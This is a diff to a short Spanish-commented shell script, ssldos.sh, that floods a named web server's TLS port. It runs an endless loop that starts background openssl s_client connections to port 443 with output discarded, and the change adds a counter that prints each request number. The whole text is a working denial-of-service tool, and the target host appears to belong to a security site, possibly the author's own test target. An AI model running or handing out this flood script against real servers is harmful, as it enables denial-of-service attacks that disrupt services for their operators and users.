@@ -5,6 +5,9 @@
 # ./ssldos.sh
 # Para parar Control + C
 
-while true; do
+contador=0
+
+while : ;do
         openssl s_client -connect web.hackingyseguridad.com:443 2>/dev/null 1>/dev/nul&
+        contador=`expr $contador + 1`; 	echo "Consulta numero: " $contador
 done
